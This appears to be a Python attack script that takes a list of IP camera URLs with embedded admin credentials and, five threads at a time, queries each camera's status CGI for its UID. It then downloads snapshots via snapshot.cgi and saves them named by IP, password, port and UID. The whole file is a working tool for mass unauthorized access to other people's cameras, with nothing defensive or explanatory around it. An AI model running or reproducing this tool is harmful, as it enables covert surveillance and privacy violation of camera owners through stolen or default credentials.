# -*- coding: utf-8 -*-

# line like http://admin:paswd@x.x.x.x:81/

import sys
from multiprocessing.dummy import Pool as ThreadPool
from threading import Lock
import urllib.request, urllib.error
import socket
import re

socket.setdefaulttimeout(30)

urls = [line.strip() for line in open(sys.argv[1], 'r')]
urls = [x for x in urls if x]
ipPattern = re.compile('\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}')
login = "admin"

def parse(urls):
    try:
        url = str(urls[7:-1])
        ipaddr = re.findall(ipPattern,url)
        snappath = url.split('@')[1]
        passw = str(url.split(':')[1].split('@')[:-1])[2:-2]
        #passw = re.sub('[<>\|@()#$%^&*]', '', passw)

        if passw == '' or passw == '<empty>':
            port = url.split(':')[-1]
            filename = snappath.split(':')[0]
            filename = "{}-{}.jpg".format(filename,port)
            get_img = "http://{}/snapshot.cgi?user={}&pwd=".format(snappath,login)
            print_url = "http://{}/snapshot.cgi?user={}&pwd= \t - \t OK".format(snappath,login)
            port = url.split(':')[1]

        else:
            port = url.split(':')[2]
            filename = snappath.split(':')[0]

            response = urllib.request.urlopen("http://{}/get_status.cgi?user={}&pwd={}".format(snappath,login,passw))
            a = response.read()
            uid = str(a).split(';')[1][18:-1]
            uid = re.sub('[<>\|@()#$%^&*]', '', uid)
            filename = "{}-{}-{}-{}.jpg".format(filename,passw,port,uid)

            #filename = "{}-{}-{}.jpg".format(filename,passw,port)
            get_img = "http://{}/snapshot.cgi?user={}&pwd={}".format(snappath,login,passw)
            print_url = "http://{}/snapshot.cgi?user={}&pwd={} \t - \t OK".format(snappath,login,passw)


        urllib.request.urlretrieve(get_img,filename)
        print(print_url)

    except urllib.error.HTTPError as e:
        if e.code == 401:
            print("{} err Unauthorized".format(urls))
        else:
            print(str(urls) + " err req. code")
    except socket.error:
        try:
            urllib.request.urlopen("http://{}/camera_control.cgi?user={}&pwd={}".format(snappath,login,passw))
        except urllib.error.HTTPError as e:
            if e.code == 200:
                urllib.request.urlretrieve("http://{}/snapshot.cgi?user={}&pwd={}".format(snappath,login,passw),filename)
                print("http://{}/snapshot.cgi?user={}&pwd={} \t - \t OK".format(snappath,login,passw))
            else:
                print("http://{}/snapshot.cgi?user={}&pwd={} \t - \t err socket".format(snappath,login,passw))
        except:
            print("http://{}/snapshot.cgi?user={}&pwd={} \t - \t camera socket err".format(snappath,login,passw))
    except:
        #print("http://{}/snapshot.cgi?user={}&pwd={} - err oth".format(snappath,login,passw))
        #print_url = re.sub('[<>\|@()#$%^&*]', '', print_url)
        print("{} - err oth".format(ipaddr))

lock = Lock()
pool = ThreadPool(5)

pool.map(parse, urls)
pool.close()
pool.join()
